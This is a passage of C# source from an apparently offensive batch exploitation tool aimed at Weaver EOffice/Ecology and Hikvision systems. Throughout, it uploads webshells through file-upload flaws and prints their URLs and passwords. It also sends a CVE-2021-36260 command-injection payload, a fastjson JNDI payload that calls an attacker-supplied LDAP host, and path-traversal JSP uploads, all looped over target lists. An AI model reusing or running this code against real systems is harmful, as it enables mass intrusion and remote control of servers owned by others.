                    string resp1Content = resp1.Content.ReadAsStringAsync().Result;

                    // 检测 resp1 中的响应内容中是否包含随机所上传的 php 文件名
                    if (resp1Content.Contains($"{webshell_Name}"))
                    {
                        // 从 resp1 中按照 * 号分割得到所上传的时间戳路径
                        string[] pocphpPathArray = resp1Content.Split('*');
                        // 得到所上传的 php 文件的完整地址
                        string poc2Url = baseUrl + "/attachment/" + pocphpPathArray[0] + "/" + webshell_Name;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        resp2.EnsureSuccessStatusCode();
                        bool hasSetCookieHeader = resp2.Headers.Contains("Set-Cookie");
                        // 因为如果上传的一句话访问这个文件能够连上的话、一般就会有 session 建立了，所以这里直接检测是否有 Set-Cookie 头来稍微精确一点的判断是否上传成功
                        if (hasSetCookieHeader)
                        {
                            // 这里挺难精确判断我们的 webshell 是否成功执行了的
                            // 但是因为 webshell 文件名是随机的，所以我们请求这个 webshell 的路径它响应的时候有 Set-Cookie 头那就说明大概率是上传成功了
                            // 但是也不排除有那种由于 php 版本或者一些禁用模块等等问题导致 webshell 执行会报错的情况
                            richtextBox.AppendText("[+] " + "EOffice8 webshell 上传成功: " + poc2Url + "天蝎 " + "pass: oldqax" + "\n");
                            richtextBox.AppendText("[*] " + "但某些 web 服务器可能限制了 attachment 目录的执行权限或该服务器不支持 php4 解析\n");
                            return;
                        }
                        else
                        {
                            richtextBox.AppendText("[*] " + "EOffice8 webshell 上传了但可能未能执行或已被删除、需手动排查: " + poc2Url + "  \n");
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] Check FileUpload Error!!!\n EOffice8 webservice Upload Error! :  " + url + ex.Message + "\n");
                    return;
                }

            }
        }

        private void weaver_CheckUpload_Eoffice_CNVD_2021_49104(Uri url, System.Windows.Forms.RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=";

            // 调试专用:
            /*
             var handler = new HttpClientHandler
             {
                 Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
             };
             // 需要调试的时候这里的 HttpClient 中的参数就传入 handler
           */
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 创建 MultipartFormDataContent 对象
                var multipartContent = new MultipartFormDataContent("wmdmjvslfotalikhnlhv");

                // TODO: 这里看需不需所生成的是随机文件名? 还是直接写死一个文件名
                // 随机生成一个类似 yiaihdzdwbnjvpupswwn 这种长度同时只有小写字母的字符串
                //string randomString = Path.GetRandomFileName().Replace(".", "");
                //string pocphpName = randomString + ".php";
                // 添加文件请求数据
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<?php echo \"f63e7d5dd17a72881d5b485f9d54f6b5\"; unlink(__FILE__); ?>"));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "Filedata",
                    FileName = "f63e7d5dd17a72881d5b485f9d54f6b5.php"
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);


                req1.Content = multipartContent;

                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    string resp1Content = resp1.Content.ReadAsStringAsync().Result;

                    // 检测 resp1 中的响应内容中是否包含 logo-eoffice.php 字符串
                    if (resp1Content.Contains("logo-eoffice.php"))
                    {
                        // 下一步去请求我们所上传的 logo-eoffice.php 看响应中是否包含执行结果: 2499368491、 这里也是暂时写死了文件名 TODO: 后续可能看能否修改成随机文件名
                        string poc2Url = baseUrl + "/images/logo/logo-eoffice.php";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果 poc1 发送成功才进行 poc2 的检测
                            string resp2Content = resp2.Content.ReadAsStringAsync().Result;
                            if (resp2Content.Contains("f63e7d5dd17a72881d5b485f9d54f6b5"))
                            {
                                // 在这里执行对 richTextBox_weaverAllCheck 的操作
                                richtextBox.AppendText("[+] " + url + " 泛微 EOffice 的图标任意文件上传漏洞 CNVD-2021-49104" + "\n");
                                return;
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }


            }
        }
        private void weaver_UploadExp_Eoffice_CNVD_2021_49104(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=";

            // 调试专用:
            /*
             var handler = new HttpClientHandler
             {
                 Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
             };
             // 需要调试的时候这里的 HttpClient 中的参数就传入 handler
           */
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                var multipartContent = new MultipartFormDataContent("wmdmjvslfotalikhnlhe");    // 这里上传包的分割线后边可能需要改成随机的

                // 天蝎一句话木马文件要放在当前程序目录下、密码: oldqax
                string filePath = "api.php";
                // 读取文件内容到字节数组
                byte[] fileBytes = File.ReadAllBytes(filePath);
                // 创建 ByteArrayContent 实例并设置内容
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "Filedata",
                    FileName = "f63e7d5dd17a72881d5b485f9d54f6b5.php"          // 这里所上传的 MD5 的这个文件名可能后边需要改成随机的
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;

                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    string resp1Content = resp1.Content.ReadAsStringAsync().Result;
                    // 检测 resp1 中的响应内容中是否包含 logo-eoffice.php 字符串
                    if (resp1Content.Contains("logo-eoffice.php"))
                    {
                        // 下一步去请求我们所上传的 logo-eoffice.php 看响应中是否包含执行结果: 2499368491、 这里也是暂时写死了文件名 TODO: 后续可能看能否修改成随机文件名
                        string poc2Url = baseUrl + "/images/logo/logo-eoffice.php";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        resp2.EnsureSuccessStatusCode();
                        bool hasSetCookieHeader = resp2.Headers.Contains("Set-Cookie");
                        // 因为如果上传的一句话访问这个文件能够连上的话、一般就会有 session 建立了，所以这里直接检测是否有 Set-Cookie 头来稍微精确一点的判断是否上传成功
                        if (hasSetCookieHeader)
                        {
                            // 上边这个 if 判断只能判断别人服务器上是否有这个文件、但是无法精确判断我们的就一定传上去了、同时也无法判断马一定能连
                            richtextBox.AppendText("[+] " + "CNVD-2021-49104 上传成功: " + url + "images/logo/logo-eoffice.php" + "天蝎 " + "pass: oldqax" + "\n");
                            return;
                        }
                        else
                        {
                            // 需要处理即使没有 Set-Cookie 头的情况、但是有可能有些目标 webshell 是写上去了、但是它的 webshell 的路径是改动过的这种情况、这种只能用户自己去手动测试了
                            if (resp1Content.Contains("logo-eoffice.php"))
                            {
                                richtextBox.AppendText("[*] " + "CNVD-2021-49104 异常攻击目标、webshell 可能被杀或服务器路径更改、需人工检测: " + url + "images/logo/logo-eoffice.php" + "天蝎 " + "pass: oldqax" + "\n");
                                return;
                            }
                            else
                            {
                                return;
                            }
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] FileUpload Attack Error!!!\n EOffice CNVD-2021-49104:  " + url + ex.Message + "\n");
                    return;
                }
            }
        }


        // 可能后边还是需要一个识别到底是泛微的 ECology Emobile EOffice 还是 EOffice10 的函数、然后好让 CheckUploadAll 这个函数可以根据 web 指纹来调用对应的检查
        // 通过这种方式来降低检测漏洞时的发包量、因为泛微的漏洞检测是比较耗时的
        private void Weaver_FingerOut(string url)
        {
            // 根据 url 首先进行指纹识别、然后这个函数通过返回不同的数字来表示到底这个 url 所对应的是泛微的哪个产品
            // TODO: Finish the identify code below:
        }

        // 检查一个 url 的泛微相关的所有文件上传漏洞
        private void Weaver_CheckUpload_All(List<string> targets, System.Windows.Forms.RichTextBox richtextBox)
        {
            foreach (string target in targets)
            {
                Uri url = new Uri(target);
                // 这里后续肯定是要通过调用指纹识别函数来修改下边的函数调用的、但是现在指纹识别函数还没搞定
                weaver_CheckUpload_Eoffice10_iWebOffice(url, richtextBox);
                weaver_CheckUpload_Eoffice10_welink(url, richtextBox);
                weaver_CheckUpload_Eoffice8_webservice(url, richtextBox);
                weaver_CheckUpload_Eoffice_CNVD_2021_49104(url, richtextBox);
                weaver_CheckUpload_Ecology_workrelate(url, richtextBox);
                weaver_CheckUpload_Ecology_pageUploadOperation(url, richtextBox);
                _ = weaver_CheckUpload_Ecology_ktreeUploadActionAsync(url, richtextBox);
                _ = weaver_CheckUpload_Ecology_ctrlzipUploadAsync(url, richtextBox);
            }
        }

        private void Weaver_ExpUpload_All(List<string> targets, System.Windows.Forms.RichTextBox richtextBox)
        {
            // 毕竟是批量上传利用、payload 存在一定的危害性、所以需要尽量少一点的发包            
            string selectedUpload = comboBox_weaverUpAttack.Text;

            // 首先需要根据对应的 comboBox 的选择来判断是使用哪个漏洞利用函数
            if (selectedUpload == "Eoffice10_iWebOffice_Up")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Eoffice10_iWebOffice(url, richtextBox);
                }
            }
            if (selectedUpload == "Eoffice10-welink")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Eoffice10_welink(url, richtextBox);
                }
            }
            if (selectedUpload == "Eoffice_CNVD-2021-49104")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Eoffice_CNVD_2021_49104(url, richtextBox);
                }
            }
            if (selectedUpload == "Eoffice8-webservice")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Eoffice8_webservice(url, richtextBox);
                }
            }
            if (selectedUpload == "Ecology-workrelate-Upload")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Ecology_workrelate(url, richtextBox);
                }
            }
            if (selectedUpload == "Ecology-page-UploadOperation")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Ecology_pageUploadOperation(url, richtextBox);
                }
            }
            if (selectedUpload == "Ecology-ktree-UploadAction")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    _ = weaver_UploadExp_Ecology_ktreeUploadAction(url, richtextBox);
                }
            }
            if (selectedUpload == "Ecology-ctrlzip-Upload")
            {
                foreach (string target in targets)
                {
                    Uri url = new Uri(target);
                    weaver_UploadExp_Ecology_ctrlzipUpload(url, richtextBox);
                }
            }
        }

        // 泛微所有漏洞检测的调用函数
        private void weaverAllCheck(List<string> targets, System.Windows.Forms.RichTextBox richtextBox)
        {
            richtextBox.AppendText("[*] 开始测试目标列表中所有泛微漏洞...." + "\n");

            // 如果目标加载成功，开始批量检测
            Weaver_CheckUpload_All(targets, richtextBox);
            richtextBox.AppendText("[*] 检测流程结束！ 小老弟、有洞没洞都看缘分" + "\n");

        }

        public void yan()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox7.Text + "/mz";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                richTextBox3.Text = reader.ReadToEnd();
                if (response.StatusCode == HttpStatusCode.OK)
                {

                    MessageBox.Show("存在海康威视CVE-2021-36260命令执行漏洞");
                }
                else
                {

                    MessageBox.Show("不存在海康威视CVE-2021-36260命令执行漏洞");
                }
            }

            catch (WebException ex)
            {

                if (((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.OK)
                {
                    MessageBox.Show("存在海康威视CVE-2021-36260命令执行漏洞");
                }
                else
                {
                    MessageBox.Show("不存在海康威视CVE-2021-36260命令执行漏洞");
                    richTextBox3.Text = "";
                }

            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                yan();
            }
            catch (WebException ex)
            {

                if (((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.OK)
                {
                    //       MessageBox.Show("存在海康威视CVE-2021-36260命令执行漏洞");
                }
                else
                {
                    //      MessageBox.Show("不存在海康威视CVE-2021-36260命令执行漏洞");
                }


            }

        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (textBox7.Text == "")
            {

                MessageBox.Show("请输入信息");

            }
            else
            {


                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

                string dictionaryPath = "hivrce.txt";
                string[] urls = File.ReadAllLines(dictionaryPath);


                //    foreach (String url in urls)
                //     {



                Task[] tasks = new Task[urls.Length];
                for (int i = 0; i < urls.Length; i++)
                {

                    String urla = urls[i];
                    tasks[i] = Task.Run(() =>
                    {

                        try
                        {



                            String urlss = urla + "/SDK/webLanguage";
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                            request.Method = "PUT";
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                            request.Accept = "*/*";
                            request.ContentType = "application/xml";

                            //    request.Headers.Add("Sec-Fetch-Dest", "document");
                            //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                            //    request.Headers.Add("Sec-Fetch-Site", "none");
                            //    request.Headers.Add("Sec-Fetch-User", "?1");
                            request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                            string xmlData1 = "<?xml version='1.0' encoding='UTF-8'?><language>$(id > webLib/mz)</language>";
                            //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                            //   request.ContentLength = postData.Length;
                            //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                            //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                            //        byte[] byte1 = encoding.GetBytes(xmlData);
                            //      request.ContentLength = byte1.Length;
                            StreamWriter ss = new StreamWriter(request.GetRequestStream());
                            ss.Write(xmlData1);
                            ss.Close();

                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                            Stream getStream = response.GetResponseStream();
                            StreamReader streamreader = new StreamReader(getStream);
                            String sss = streamreader.ReadToEnd();




                        }





                        catch (Exception ex)
                        {
                            button8.Enabled = true;

                        }
                    });
                }

                // 等待所有任务完成

            }
        }

        public void yan1()
        {


            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            string dictionaryPath1 = "hivrce.txt";
            string[] urls = File.ReadAllLines(dictionaryPath1);

            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    //   foreach (String m in urls)
                    //     {


                    String targeturl11 = urla + "/mz";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);

                    request.Method = "GET";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    HttpStatusCode statusCode = response.StatusCode;
                    Stream stream = response.GetResponseStream(); //接收请d求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                                                                                               //   button11.Enabled = true;
                    textBox3.Text = reader.ReadToEnd();//     string sss = reader.ReadToEnd();
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        richTextBox3.AppendText("[!]" + urla + "存在海康威视CVE-2021-36260命令执行漏洞" + Environment.NewLine);
                        richTextBox3.ForeColor = Color.Green;

                    }
                    else if (textBox3.Text == "0")
                    {

                        richTextBox3.AppendText(urla + "不存在海康威视CVE-2021-36260命令执行漏洞" + Environment.NewLine);
                    }





                    //  button11.Visible = true;


                });
            }

            // 等待所有任务完成
        }

        private void button8_Click(object sender, EventArgs e)
        {
            richTextBox3.Text = "";
            yan1();
        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void button9_Click(object sender, EventArgs e)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox9.Text + "/bic/ssoService/v1/applyCT";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST"; //POST请求
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                req.ContentType = "application/json";
                req.Headers.Add("cmd", textBox10.Text);
                String postid = "\r\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + textBox11.Text + ":1389/TomcatBypass/TomcatEcho\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
                StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(postid);
                req.ContentLength = byte1.Length;
                ss.Write(postid);
                ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                richTextBox4.Text = streamreader.ReadToEnd();
                //   richTextBox7.Text = richTextBox7.Text.Replace("code", "");
                //      richTextBox7.Text = richTextBox7.Text.Replace("msg", "");
                //      richTextBox7.Text = richTextBox7.Text.Replace("0x00215000", "");
                //     richTextBox7.Text = richTextBox7.Text.Replace("unknow error", "");

            }

            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            if (textBox9.Text == "")
            {
                MessageBox.Show("请输入VPS地址");

            }
            else
            {


            }

            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "fastjsonrce.txt";
            string[] urls = File.ReadAllLines(dictionaryPath);


            //    foreach (String url in urls)
            //     {



            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {




                    String urlss = urla + "/bic/ssoService/v1/applyCT";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                    request.Method = "POST";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    request.ContentType = "application/json";

                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    request.Headers.Add("cmd", "whoami");

                    String postid = "\r\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + textBox11.Text + ":1389/TomcatBypass/TomcatEcho\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                                                                                     //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                                                                                     //   request.ContentLength = postData.Length;
                                                                                     //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    //        byte[] byte1 = encoding.GetBytes(xmlData);
                    //      request.ContentLength = byte1.Length;

                    ss.Write(postid);
                    ss.Close();

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    Stream getStream = response.GetResponseStream();
                    StreamReader streamreader = new StreamReader(getStream);
                    String ssss = streamreader.ReadToEnd();
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        richTextBox4.AppendText(urla + "[!!!]" + "存在海康威视fastjson漏洞" + Environment.NewLine);

                    }
                    else if (response.StatusCode == HttpStatusCode.InternalServerError)
                    {

                        richTextBox4.AppendText(urla + "不存在海康威视fastjson漏洞" + Environment.NewLine);
                    }
                });
            }
        }

        private void button11_Click(object sender, EventArgs e)
        {
            try
            {
                string filePath = "bx.jsp";
                string uploadUrl = textBox12.Text + "/eps/api/resourceOperations/upload?token=" + textBox13.Text; // 替换为接口的URL
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"bx.jsp\"\r\n" +
                                  "Content-Type: image/jpeg\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();
                JsonDocument doc = JsonDocument.Parse(ssss);
                JObject jobj = JObject.Parse(ssss);
                String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                textBox3.Text = res;
                richTextBox5.Text = jobj["message"].ToString();
                if (richTextBox5.Text == "上传附件成功")
                {

                    richTextBox5.AppendText("成功" + "url:" + "/eps/upload" + "/" + textBox3.Text + ".jsp" + "密码:Tas9er");
                }
                else if (richTextBox5.Text == "上传附件失败:null")

                    richTextBox5.AppendText("上传失败" + "url:" + "/eps/upload" + "/" + filePath);

            }
            catch (Exception ex)
            {
            }
        }

        private void button12_Click(object sender, EventArgs e)
        {
            try
            {


                string filePath = "bx.php";
                string uploadUrl = textBox12.Text + "/eps/api/resourceOperations/upload?token=" + textBox13.Text; // 替换为接口的URL
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"bx.php\"\r\n" +
                                  "Content-Type: image/jpeg\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();
                JObject jobj = JObject.Parse(ssss);
                JsonDocument doc = JsonDocument.Parse(ssss);
                String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                textBox3.Text = res;
                richTextBox5.Text = jobj["message"].ToString();

                if (richTextBox5.Text == "上传附件成功")
                {

                    richTextBox5.AppendText("成功" + "url:" + "/eps/upload" + "/" + textBox3.Text + ".php" + "密码:Tas9er");
                }
                if (richTextBox5.Text == "上传附件失败:null" && textBox3.Text == "404")

                    richTextBox5.AppendText("上传失败" + "url:" + "/eps/upload" + "/" + filePath);

            }
            catch (Exception ex)
            {




            }
        }

        private void button13_Click(object sender, EventArgs e)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string filePath = "cess.txt";
                string uploadUrl = textBox14.Text + "/center/api/files;.js";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt\"\r\n" +
                                  "Content-Type: application/octet-stream\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();
                JsonDocument doc = JsonDocument.Parse(ssss);

                String res = doc.RootElement.GetProperty("data").GetProperty("filename").GetString();
                String res1 = doc.RootElement.GetProperty("data").GetProperty("link").GetString();

                richTextBox6.AppendText("成功上传" + res + "\r\n" + res1 + Environment.NewLine);
            }
            catch (Exception ex)
            {

            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string filePath = "bx1.jsp";
                string uploadUrl = textBox14.Text + "/center/api/files;.js";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/bx1.jsp\"\r\n" +
                                  "Content-Type: application/octet-stream\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
